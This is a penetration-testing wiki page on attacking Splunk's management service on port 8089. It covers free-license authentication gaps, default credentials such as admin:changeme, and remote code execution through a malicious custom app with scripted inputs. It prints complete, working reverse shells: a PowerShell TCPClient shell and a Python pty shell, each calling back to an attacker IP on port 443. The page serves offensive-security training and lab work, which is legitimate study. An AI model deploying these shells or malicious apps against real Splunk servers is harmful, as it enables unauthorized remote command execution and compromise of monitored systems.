# 8089 - Pentesting Splunkd

{{#include ../banners/hacktricks-training.md}}

## **Basic Information**

- Log analytics tool used for data gathering, analysis, and visualization
- Commonly used in security monitoring and business analytics
- Default ports:
  - Web server: 8000
  - Splunkd service: 8089

### Vulnerability Vectors:

1. Free Version Exploitation

- Historical Splunk Enterprise trials could switch to a limited Free license after expiry; licensing and conversion behavior varies by release.
- The Free license historically disabled authentication, so verify the active license and current product documentation instead of assuming every port 8089 service is unauthenticated.<sup>[[2]](#references)</sup>
- Potential security risk if left unmanaged
- Administrators may overlook security implications

2. Credential Weaknesses

- Older releases used default credentials such as `admin:changeme`; current installations require an administrator password during setup.
- Newer versions: Credentials set during installation
- Potential for weak password use (e.g., `admin`, `Welcome`, `Password123`)

3. Remote Code Execution Opportunities

- Multiple code execution methods:
  - Server-side Django applications
  - REST endpoints
  - Scripted inputs
  - Alerting scripts
- Cross-platform support (Windows/Linux)
- Scripted inputs can run:
  - Bash scripts
  - PowerShell scripts
  - Batch scripts

Key Exploitation Potential:

- Sensitive data storage
- Lack of authentication in free version
- Multiple vectors for potential remote code execution
- Possibility of leveraging scripted inputs for system compromise

### Shodan

- `Splunk build`

## RCE

### Create Custom Application

Splunk offers a sophisticated method for remote code execution through custom application deployment, leveraging its cross-platform scripting capabilities. The core exploitation technique revolves around creating a malicious application that can execute reverse shells on both Windows and Linux systems.<sup>[[1]](#references)</sup>

A custom application can define scripted inputs in supported interpreters such as shell, PowerShell, batch, or the Python runtime shipped with the applicable Splunk release. Interpreter availability and Python version are release/platform specific.<sup>[[3]](#references)</sup>

The `reverse_shell_splunk` example app includes a Python payload (`bin/rev.py`) and PowerShell launcher (`bin/run.ps1`); the direct file references are retained because they clarify the expected app layout. Use them only in an authorized lab or create a benign proof-of-execution app.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

The exploitation process follows a consistent methodology across platforms:

```
splunk_shell/
├── bin        (reverse shell scripts)
└── default    (inputs.conf configuration)
```

The critical configuration file `inputs.conf` enables the script by:

- Setting `disabled = 0`
- Configuring a 10-second execution interval
- Defining the script's source type

Deployment requires an account permitted to install apps (or filesystem access to an app directory), and the script runs with the OS privileges of the Splunk service account. It is not an unauthenticated primitive by itself.<sup>[[3]](#references)[[4]](#references)</sup>

1. Create the malicious application package
2. Set up a listener (Netcat/socat) on the attacking machine
3. Upload the application through Splunk's interface
4. Trigger automatic script execution upon upload

Sample Windows PowerShell reverse shell:

```bash
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()
```

Sample Linux Python reverse shell:

```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```

### RCE & Privilege Escalation

In the following page you can find an explanation how this service can be abused to escalate privileges and obtain persistence:


{{#ref}}
../linux-hardening/software-information/splunk-lpe-and-persistence.md
{{#endref}}

## References

- [1] [Attacking Splunk - RCE via custom application (HTB Academy)](https://academy.hackthebox.com/module/113/section/1213)
- [2] [Splunk — Types of Splunk software licenses](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.4/configure-splunk-licenses/types-of-splunk-software-licenses)
- [3] [Splunk Developer — Scripted input examples](https://dev.splunk.com/enterprise/docs/developapps/inputdatatypes/scriptedinputs/)
- [4] [Splunk — Install apps from a package](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.4/manage-apps-and-add-ons/install-apps-and-add-ons-from-an-installation-package)
- [5] [0xjpuff/reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk)
- [6] [`reverse_shell_splunk/bin/rev.py`](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py)
- [7] [`reverse_shell_splunk/bin/run.ps1`](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1)

{{#include ../banners/hacktricks-training.md}}
